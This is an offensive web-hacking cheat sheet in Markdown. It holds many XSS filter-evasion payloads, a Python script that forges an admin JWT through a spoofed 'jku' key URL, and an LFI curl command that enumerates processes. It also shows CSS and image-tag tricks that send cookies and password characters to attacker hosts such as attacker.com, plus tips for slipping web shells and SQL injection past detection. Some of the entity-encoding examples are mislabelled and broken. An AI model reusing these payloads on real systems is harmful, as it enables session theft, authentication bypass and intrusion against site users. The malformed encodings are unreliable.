# link
* Char code finder
    - http://www.mauvecloud.net/charsets/CharCodeFinder.html

# XSS
* https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
* https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
* https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
* https://awesomeopensource.com/project/s0md3v/AwesomeXSS

# JWKS Spoofing
* generate private/public key
* generate/modify token
* host jwks.json file
* attack
```python
from jwcrypto import jwk, jwe, jwt
from jwcrypto.common import json_encode, json_decode

private_key = jwk.JWK.generate(kty='RSA', alg='RS256', size=4096)
public_key = private_key.export(private_key=False)
print(public_key)
token = jwt.JWT(
    header={"typ": "JWT", "alg": "RS256", "jku": "http://domain/static/../redirect?url=<ip>/jwks.json?00"},
    claims={"user": "admin"}
)
token.make_signed_token(private_key)
print(token.serialize())
```

# LFI
* enum process using LFI
> curl http://<ip>/index.php?page=../../../../../../../../../../proc/[100-500]/cmdline


# Payloads
## document.cookie
100,111,99,117,109,101,110,116,46,99,111,111,107,105,101

## global object
* document.cookie
self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"]
* eval(document.cookie)
self["\x65\x76\x61\x6c"]("document.cookie")
* document.cookie
String.fromCharCode("100,111,99,117,109,101,110,116,46,99,111,111,107,105,101")

## encoding
* alert(1), hex encoding
\x61\x6c\x65\x72\x74\x28\x31\x29



# Evasion techniques
## HTML
* Remove white space, can use / after quoted attributes
* Avoid the src attribute:
    - <object><param name="src" value="javascript:alert(0)"></param></object>
    - <object data="javascript:alert(0)"> 
    - <img src=x:alert(alt) onerror=eval(src) alt=0>
* Using isindex tag
    - <isindex type=image src=1 onerror=alert(1)>
    - <isindex action=javascript:alert(1) type=image>

## Injecting XHTML
* <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert('xss');</x:script>

## javascript
* No parenthesis
    - location='javascript:alert(0)';
    - location=name;
* Code execution without quotes/parenthesis
    - x setter=eval,x=1
* Avoid #
    - location=location.hash.slice(1);
    - location=location.hash // FF only
* Alerts
    - alert(document.cookie)
    - alert(document['cookie'])
    - with(document)alert(cookie)
* If has control on the referrer header
    - eval(document.referrer.slice(10));
    - eval(0+location.string) //or 1+location.string 
* Using control characters
    - http://site.com/?p=";eval(unescape(location))//#%0Aalert(0)
* For IE and Opera
    - ""+{toString:alert}
    - ""+{valueOf:alert}
* Encoded payload:
    - (É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å) [Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])() [µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)
    - ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)

## VBScript
* Using event handler (for IE)
    - <b/alt="1"onmouseover=InputBox+1language=vbs>test</b>
* Using eval+name

## HTML5
* </a onmousemove="alert(1)">
* <style>input[name=password][value*=a]{ background:url('//attacker?log[]=a');}</style>
* <iframe seamless src=”login.asp”/>

## Other techniques
* data:text/html,<script>alert(0)</script> (not IE)
* data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg== (not IE)
* ?injection=<script+&injection=>alert(1)></script> (not IE8)
* XML in js
    - <script>var m=<html><a href=”//site”>link</a></html></script> // XML inside JS
* js in xml
    - <html><title>{alert('xss')}</title></html>
* <img src="x:gif" onerror="alert(0)">
* <img src="x:alert" onerror="eval(src%2b'(0)')">
* <img src="x:gif" onerror="eval('al'%2b'lert(0)')">
* <img src="x:gif" onerror="window['al\u0065rt'](0)"></img> 
* ";document.write('<img src=http://p42.us/x.png?'%2bdocument.cookie%2b'>');"
* ";document.write('<img sr'%2b'c=http://p42.us/x.png?'%2bdocument['cookie']%2b'>');"

## Unicode
* < equivalents:
    - 0x3C
    - 0xC0 0xBC
    - 0xE0 0x80 0xBC
    - 0xF0 0x80 0x80 0xBC
    - %C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
* Character "eating"
    - <img src="x:ö" title="onerror=alert(1)//">
    - ö is \x90 NOP, php utf8_decode transform to <img src="x:? title=" onerror=alert(1)//">

# IE xss filter rules
* findstr /C:"sc{r}" \WINDOWS\SYSTEM32\mshtml.dll|find "{" 

# CSS attacks
```html
<style>
input[type=password][value^=a]{
– background:"//attacker.com/log.php?hash[]=a";
}
input[type=password][value^=b]{
– background:"//attacker.com/log.php?hash[]=b";
}…
</style> 
```

# Unclosed Quote
* THE ATTACKER RECEIVES ALL THE HTML CODE UNTILL THE QUOTE
```html
<img src='http://attacker.com/log.php?HTML=
<form>
<input type=“hidden” name=“nonce”
value=“182b1cdf1e1038a”>
…
…
<script>
x=‘asdf’;
```

# Same-origin
* <a href=“?xss=<script>”>link</a>

# Disabling the filter
```
header(“Location: ”.$_GET[‘redir’]);
redir=“\nX-XSS-Protection:+0\n\n<script…” 
```


# Filter bypass top 10 techniques
1. <div>$injection</div>
2. <input value=“$injection”>
3. <script>var a = “$injection”; </script> 
4. Fragmented ?url='%20x=`&name=`%20onmouseover='alert(1)
```html
<a href='<?php echo htmlentities($url);?>'/>
    <?php echo htmlentities($name);?>
</a>
```
5. DOM based /index.php/<script x>alert(1)</script>/
```html
 document.write("<a href='/suggestToFriend/?p="+location.href+"'>");
```
6. Inside event attributes ?id=alert(1)
```html
<a href="#" onclick="deleteTopic($id)">
```
7. Strings that were modified in the backend
```html
<script>product=‘<?=strtolower($prod)?>’;</script>
```
8. Attacks abusing charset peculiarities
    - Unicode Stuff Already Mentioned!
9. Attacks that are not reflected in the same page
```
https://www.dev.java.net/servlets/Search?mode=1&resultsPerPage=%22%27%2F%3E%3Cscript%3Ealert%28'Props+To+TheRat'%29%3C%2Fscript%3E&query=3&scope=domain&artifact=2&Button=Search 
```
10. Attacks that are made to content not loaded as HTML. Attack in 2 steps
```html
<img src=“http://victim/newUser?name=<script>alert(1)</script>”/>
<iframe src=“http://victim/newUser”></iframe>
```

# Rule of thumbs
* Stop using alter(1), use prompt(1)
* Stop using <script>, use <ScRIPT x src=//0x.lv?
* Stop using ' or 1=1--, use ' or 2=2--
* Stop using UNION SELECT, use UNION ALL SELECT
* Stop using /etc/passwd, use /foo/../etc/bar/../passwd
* Stop using http://yourhost.com/r57.txt, use https://yourhost.com/r57.txt
* Stop using c99.php, shell.aspx or cmd.jsp, use rofl.php

# Encoding
* HTML Entity Encoding
&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;
* Hex Entity Encoding
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
* Decimal Entity Encoding
&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;
* Octal Entity Encoding
&#x74;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;&#x141;&#x154;&#x145;&#x162;&#x164;&#x50;&#x47;&#x170;&#x163;&#x163;&#x47;&#x51;&#x74;&#x57;&#x163;&#x143;&#x162;&#x151;
&#x160;&#x164;&#x76;
* Half-Width/Full-Width Characters
＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（＇ｘｓｓ＇）＜／ｓｃｒｉｐｔ＞
* Half-Width/Full-Width Unicode
\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e